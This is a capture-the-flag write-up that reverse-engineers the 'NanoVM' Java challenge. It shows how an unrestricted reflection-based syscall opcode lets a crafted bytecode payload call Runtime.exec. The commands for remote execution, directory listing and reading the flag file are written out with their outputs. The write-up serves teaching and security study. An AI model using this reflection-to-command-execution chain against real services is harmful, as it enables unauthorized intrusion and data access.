UiTHack26 NanoVM Technical Writeup

A full reverse-engineering and exploitation writeup for the challenge “Yo dawg, I heard you like VMs, so I put a VM in your VM!”

Core issue: unrestricted reflection-based syscall registration inside a custom Java VM

1. Challenge Overview

The remote service listened on uithack-2.td.org.uit.no:9020 and asked for a Base64-encoded .bin payload. Locally, the challenge files were minimal:

NanoVM.class
send_payload.py

At first glance, the challenge theme suggests a “VM inside a VM” puzzle where the intended path might be a bytecode-level escape, an implementation bug in the interpreter, or a crafted nested program that breaks some sandboxing assumption.

After inspecting the provided files, it became clear that the challenge did not require exploiting low-level memory corruption in the VM. Instead, the VM already exposed a powerful and unsafe syscall layer built around Java reflection. That reflection layer was enough to achieve arbitrary code execution directly.

2. Initial File Analysis

2.1 Python helper

send_payload.py was straightforward. It:

  • reads a payload file as raw bytes
  • Base64-encodes the payload
  • connects to the remote service
  • sends the encoded blob followed by a newline
  • prints all output from the server

That tells us the exploit format is simply a custom binary blob interpreted server-side.

2.2 Java VM

NanoVM.class was supplied as compiled bytecode only, so the next step was to inspect it with javap. The decompilation immediately showed that the main interpreter method was a large tableswitch over byte opcodes ranging from -2 up to 65.

The key fields were:

Field Meaning
a byte array containing the full VM program
F instruction pointer
V object stack
x stack pointer
X integer register file
D hash map storing syscall IDs to Java Method objects
j / u call stack and call stack pointer

The VM also had a helper method that decodes strings from the program byte array:

private java.lang.String F(int);

// Reads:
//   a[offset + 1 : offset + 5] as a 4-byte big-endian length
//   a[offset + 5 : offset + 5 + len] as the string bytes

This matters because it means the VM program can contain an inline string table, and opcodes can refer to strings by integer offsets.

3. Reconstructing The Instruction Set

Several opcodes were conventional VM operations: push immediate integer, arithmetic, bitwise logic, register load/store, direct memory read/write, conditional branches, call/return, and byte reads. Those are useful, but not actually the reason the challenge falls apart.

The critical opcodes were these:

Opcode Behavior Impact
1 Push a 4-byte immediate integer onto the VM stack Used to push string offsets and syscall IDs
10 Register a syscall by resolving a class name and method name via reflection Main exploit primitive
-1 Invoke a previously registered syscall Main exploit primitive
-2 Return / halt Clean termination

3.1 Syscall registration

The implementation behind opcode 10 did the following:

  1. Read three 4-byte integers from the bytecode stream
  2. Treat the first integer as a pointer to a class name string
  3. Treat the second integer as a pointer to a method name string
  4. Treat the third integer as the expected parameter count
  5. Load the class using Class.forName(className)
  6. Iterate through public methods returned by getMethods()
  7. Select the first method matching the target name and parameter count, excluding methods with array parameters
  8. Store that Method object in a hashmap under an incrementing syscall ID

This is already enough to see the problem. There is no allowlist, no package restriction, no security manager, and no check that the method is safe. Any public Java method with a supported signature can be registered.

3.2 Syscall invocation

Opcode -1 then:

  1. Reads a 4-byte syscall ID
  2. Looks up the corresponding Method object in the hashmap
  3. Pops as many arguments from the VM stack as required by the method
  4. For parameters of type String, if the VM argument is an Integer, it converts that integer into a string by treating it as an in-program string pointer
  5. If the method is non-static, pops one extra stack value to use as the receiver object
  6. Calls Method.invoke(receiver, args)
  7. If the return type is not void, pushes the return value back onto the VM stack

That is an unrestricted reflective call gadget exposed intentionally as part of the VM design.

Important observation: the automatic conversion from integer to String means the exploit does not need to construct Java strings dynamically. It only needs to place correctly formatted string blobs inside the payload and push their offsets.

4. Why This Is Enough For RCE

With reflection available, the natural target is java.lang.Runtime.

The cleanest chain is:

  1. Register Runtime.getRuntime() as a syscall
  2. Register Runtime.exec(String) as a syscall
  3. Call getRuntime() to obtain a Runtime instance
  4. Push a pointer to a command string
  5. Call exec(String) using the returned Runtime object as the receiver

The VM makes the final step even more convenient. After invoking a method, it checks whether the returned object is a java.lang.Process. If so, it automatically forwards the process stdout and stderr streams back to the current output stream. That means command output is exfiltrated automatically, without needing a second-stage read primitive.

In other words, once Runtime.exec(String) is reachable, the VM becomes a ready-made remote command runner.

5. Building A Minimal Exploit Payload

Rather than hand-assembling the payload bytes, I wrote a small helper script, build_payload.py. The payload format used by the exploit is:

[code bytes][inline string blobs]

Each string blob is encoded as:

00 || 4-byte big-endian length || raw string bytes

The leading zero is important because the VM string decoder reads the length from offset + 1 and the bytes from offset + 5.

5.1 Minimal bytecode plan

opcode 10 + ptr("java.lang.Runtime") + ptr("getRuntime") + 0
opcode 10 + ptr("java.lang.Runtime") + ptr("exec") + 1
opcode -1 + syscall_id_1
opcode 1  + ptr(command)
opcode -1 + syscall_id_2
opcode -2

5.2 Why the stack order works

When the VM invokes a non-static method, it pops arguments first and then pops one additional object as the receiver. For Runtime.exec(String), the stack must therefore contain:

  1. receiver object lower on the stack
  2. string argument on top of it

The sequence above does exactly that:

  • -1 syscall 1 pushes the Runtime instance
  • 1 ptr(command) pushes the string pointer on top
  • -1 syscall 2 pops the string argument first, converts it to a Java string, then pops the receiver object, and finally calls exec

6. Local Verification

Before touching the remote service, I validated the exploit locally against the supplied NanoVM.class.

python3 build_payload.py 'id' payload.bin
java NanoVM payload.bin

This produced:

uid=1000(userhonest) gid=1000(userhonest) groups=1000(userhonest),65534(nogroup)

That confirmed all of the following:

  • the opcode reconstruction was correct
  • the syscall registration logic worked as expected
  • the string pointer format was correct
  • the stack layout for invoking Runtime.exec(String) was correct
  • the VM really did pipe process output automatically

7. Remote Exploitation Step By Step

7.1 Connect to the service

The challenge prompt looked like this:

$ nc uithack-2.td.org.uit.no 9020
Please send your .bin payload as a Base64 encoded string:

Instead of pasting manually, the supplied helper script was used:

python3 send_payload.py uithack-2.td.org.uit.no 9020 payload.bin

7.2 First remote RCE test

The first command attempted was id. That failed with an IOException indicating the program could not be found. The important lesson was that the remote environment did not resolve bare command names in the way expected by Runtime.exec(String).

Using absolute paths fixed that immediately:

python3 build_payload.py '/usr/bin/id' payload.bin
python3 send_payload.py uithack-2.td.org.uit.no 9020 payload.bin

Remote output:

uid=100(ctf) gid=101(ctf) groups=101(ctf)

This established that code execution on the remote host was real and that the process ran as the ctf user.

7.3 Initial guess for the flag path

A common CTF convention is to place the flag at /flag, so the next attempt was:

python3 build_payload.py '/bin/cat /flag' payload.bin
python3 send_payload.py uithack-2.td.org.uit.no 9020 payload.bin

That returned:

cat: /flag: No such file or directory

So the flag path needed to be discovered.

7.4 Enumerating the filesystem

The next step was basic recon:

python3 build_payload.py '/bin/ls /' payload.bin
python3 send_payload.py uithack-2.td.org.uit.no 9020 payload.bin

This showed a normal container-style filesystem with an /app directory, which is a strong candidate in Dockerized challenge deployments.

The next command targeted that directory directly:

python3 build_payload.py '/bin/ls -la /app' payload.bin
python3 send_payload.py uithack-2.td.org.uit.no 9020 payload.bin

That produced the critical listing:

total 36
dr-xr-xr-x 1 root root  4096 Apr 11 10:12 .
drwxr-xr-x 1 root root  4096 Apr 11 10:14 ..
-r--r--r-- 1 root root 10711 Apr 11 10:10 NanoVM.class
drwxr-xr-x 2 root root  4096 Apr 11 10:12 bin
-r--r----- 1 root ctf     35 Apr 11 10:10 flag.txt
-r--r--r-- 1 root root   713 Apr 11 10:10 server.py

This immediately revealed three useful facts:

  • the challenge files were mounted in /app
  • the flag file was /app/flag.txt
  • its permissions were root:ctf with mode 440, and the process was running in group ctf, so it should be readable

7.5 Reading the flag

python3 build_payload.py '/bin/cat /app/flag.txt' payload.bin
python3 send_payload.py uithack-2.td.org.uit.no 9020 payload.bin

Remote output:

UiTHack26{35c4p3_7h3_n4n0vM_m4tr1x}

8. What Is Actually Happening Internally

This challenge is a good example of why “custom VM” does not imply “sandbox.”

The NanoVM author implemented a syscall concept by storing reflective Java Method objects in a map and exposing a bytecode instruction to invoke them. From a design perspective, that makes the VM extremely flexible. From a security perspective, it completely defeats isolation.

The exploit did not need:

  • a buffer overflow
  • an out-of-bounds read or write
  • type confusion
  • corruption of the VM register file
  • control-flow hijacking inside the Java runtime

Instead, the intended interpreter functionality already allowed user-controlled code to:

  • name an arbitrary class
  • resolve an arbitrary public method
  • supply controlled arguments
  • invoke the method
  • receive the result

Once those conditions hold, methods such as Runtime.exec, ProcessBuilder.start, file-reading helpers, environment introspection, and many others are reachable. The VM effectively becomes a remote Java scripting interface.

9. Why Absolute Paths Were Needed

One subtle detail during exploitation was that Runtime.exec(String) with a single string argument does not behave like an interactive shell. It does not parse shell syntax, and command resolution can differ from what one expects when typing into a shell with a populated PATH.

That is why:

id

failed remotely, while:

/usr/bin/id

succeeded. The same principle was used for /bin/ls and /bin/cat.

If shell parsing had been needed, an alternative would have been to execute something like:

/bin/sh -c '...'

but this challenge did not require that because direct binary execution was sufficient.

10. Final Flag

UiTHack26{35c4p3_7h3_n4n0vM_m4tr1x}

11. Final Summary

The shortest accurate summary of the exploit is this: NanoVM exposed unrestricted Java reflection as a bytecode-level syscall mechanism, so the VM could directly register and invoke Runtime.getRuntime() and Runtime.exec(String). That yielded remote command execution immediately. After confirming execution with /usr/bin/id, filesystem enumeration under /app revealed /app/flag.txt, which was readable by group ctf. Reading that file returned the flag.

This challenge is less about escaping a VM through a bug and more about recognizing that the VM was never actually a safe sandbox to begin with.
